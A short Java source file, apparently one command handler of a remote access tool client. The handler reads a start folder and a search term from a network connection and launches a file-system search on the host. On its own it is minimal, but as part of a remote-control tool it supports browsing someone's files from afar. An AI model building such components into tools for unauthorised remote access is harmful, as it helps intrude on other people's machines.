package com.redpois0n.packets.incoming;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.FileSearch;


public class PacketFIND extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String start = Connection.readLine();
		if (!start.endsWith(File.separator)) {
			start = start + File.separator;
		}
		String what = Connection.readLine();
		boolean dir = Connection.readBoolean();
		new FileSearch(start, what, dir).start();
	}

}
